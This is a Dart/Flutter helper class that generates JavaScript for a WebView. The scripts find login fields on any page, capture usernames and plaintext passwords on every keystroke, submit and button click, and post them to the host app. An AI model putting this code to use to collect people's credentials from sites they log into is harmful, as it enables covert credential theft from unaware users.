/// Helper class to capture form data before submission
class FormCaptureHelper {
  /// Generate JavaScript to intercept form submission and capture credentials
  static String generateFormCaptureScript() {
    return '''
(function() {
  console.log('🔵 Form capture script starting...');
  
  // Find all possible input fields
  function findInputs() {
    var usernameSelectors = [
      'input[name="login"]',
      'input[name="username"]',
      'input[name="email"]',
      'input[type="email"]',
      'input[id*="email" i]',
      'input[id*="username" i]',
      'input[id*="login" i]',
      'input[placeholder*="email" i]',
      'input[placeholder*="username" i]',
      'input[class*="email" i]',
      'input[class*="username" i]'
    ];
    
    var passwordSelectors = [
      'input[type="password"]',
      'input[name="password"]',
      'input[id*="password" i]',
      'input[placeholder*="password" i]',
      'input[class*="password" i]'
    ];
    
    var usernameInput = null;
    var passwordInput = null;
    
    // Try to find username input
    for (var i = 0; i < usernameSelectors.length; i++) {
      usernameInput = document.querySelector(usernameSelectors[i]);
      if (usernameInput) break;
    }
    
    // Try to find password input
    for (var i = 0; i < passwordSelectors.length; i++) {
      passwordInput = document.querySelector(passwordSelectors[i]);
      if (passwordInput) break;
    }
    
    return { usernameInput: usernameInput, passwordInput: passwordInput };
  }
  
  // Function to capture and send credentials
  function captureCredentials(forceSend) {
    var inputs = findInputs();
    var usernameInput = inputs.usernameInput;
    var passwordInput = inputs.passwordInput;
    
    if (!usernameInput || !passwordInput) {
      return false;
    }
    
    var username = (usernameInput.value || '').trim();
    var password = passwordInput.value || '';
    
    // Send if both exist, or force send
    if ((username && password) || (forceSend && username)) {
      console.log('✅ Capturing credentials: username=' + username + ', password=' + (password ? '***' : 'empty'));
      
      if (window.FlutterChannel && window.FlutterChannel.postMessage) {
        window.FlutterChannel.postMessage(JSON.stringify({
          action: 'captureCredentials',
          username: username,
          password: password
        }));
        return true;
      }
    }
    
    return false;
  }
  
  // Setup event listeners
  function setupListeners() {
    var inputs = findInputs();
    var usernameInput = inputs.usernameInput;
    var passwordInput = inputs.passwordInput;
    
    if (!usernameInput || !passwordInput) {
      console.log('⚠️ Inputs not found, will retry...');
      setTimeout(setupListeners, 1000);
      return;
    }
    
    console.log('✅ Inputs found, setting up listeners...');
    
    // Username events
    ['input', 'keyup', 'change', 'blur'].forEach(function(eventType) {
      usernameInput.addEventListener(eventType, function() {
        captureCredentials(true); // Send username even if password empty
      }, true);
    });
    
    // Password events - CRITICAL!
    ['input', 'keyup', 'keydown', 'change', 'blur'].forEach(function(eventType) {
      passwordInput.addEventListener(eventType, function() {
        setTimeout(function() {
          captureCredentials(false); // Send when both exist
        }, 100);
      }, true);
    });
    
    // Intercept form submission
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
      form.addEventListener('submit', function(e) {
        console.log('📝 Form submit detected!');
        captureCredentials(false);
      }, true);
      
      // Also intercept via submit button
      var submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
      if (submitBtn) {
        submitBtn.addEventListener('click', function(e) {
          console.log('🔘 Submit button clicked!');
          setTimeout(function() {
            captureCredentials(false);
          }, 50);
        }, true);
      }
    });
    
    // Find all buttons that might be login buttons
    var allButtons = document.querySelectorAll('button, input[type="button"], input[type="submit"]');
    allButtons.forEach(function(button) {
      var buttonText = (button.textContent || button.value || '').toLowerCase();
      if (buttonText.includes('login') || buttonText.includes('sign in') || buttonText.includes('log in')) {
        button.addEventListener('click', function(e) {
          console.log('🔘 Login button clicked: ' + buttonText);
          setTimeout(function() {
            captureCredentials(false);
          }, 100);
        }, true);
      }
    });
  }
  
  // Continuous polling as backup
  var pollInterval = setInterval(function() {
    var inputs = findInputs();
    if (inputs.usernameInput && inputs.passwordInput) {
      var username = (inputs.usernameInput.value || '').trim();
      var password = inputs.passwordInput.value || '';
      
      // If both have values, send them
      if (username && password) {
        captureCredentials(false);
      }
    }
  }, 500);
  
  // Setup listeners immediately
  setupListeners();
  
  // Also setup after page is fully loaded
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', setupListeners);
  } else {
    setTimeout(setupListeners, 500);
  }
  
  // Use MutationObserver to detect dynamically added inputs
  var observer = new MutationObserver(function(mutations) {
    var inputs = findInputs();
    if (inputs.usernameInput && inputs.passwordInput) {
      setupListeners();
    }
  });
  
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
  
  console.log('✅ Form capture script fully loaded');
  return 'Form capture script loaded';
})();
''';
  }

  /// Generate JavaScript to extract current form values
  static String generateExtractCredentialsScript() {
    return '''
(function() {
  // Try multiple selectors
  function findInputs() {
    var usernameSelectors = [
      'input[name="login"]',
      'input[name="username"]',
      'input[name="email"]',
      'input[type="email"]',
      'input[id*="email" i]',
      'input[id*="username" i]',
      'input[id*="login" i]'
    ];
    
    var passwordSelectors = [
      'input[type="password"]',
      'input[name="password"]',
      'input[id*="password" i]'
    ];
    
    var usernameInput = null;
    var passwordInput = null;
    
    for (var i = 0; i < usernameSelectors.length; i++) {
      usernameInput = document.querySelector(usernameSelectors[i]);
      if (usernameInput && usernameInput.value) break;
    }
    
    for (var i = 0; i < passwordSelectors.length; i++) {
      passwordInput = document.querySelector(passwordSelectors[i]);
      if (passwordInput && passwordInput.value) break;
    }
    
    return { usernameInput: usernameInput, passwordInput: passwordInput };
  }
  
  var inputs = findInputs();
  
  if (inputs.usernameInput && inputs.passwordInput) {
    return JSON.stringify({
      username: inputs.usernameInput.value || '',
      password: inputs.passwordInput.value || '',
      hasValues: !!(inputs.usernameInput.value && inputs.passwordInput.value)
    });
  }
  
  return JSON.stringify({
    username: null,
    password: null,
    hasValues: false
  });
})();
''';
  }
}

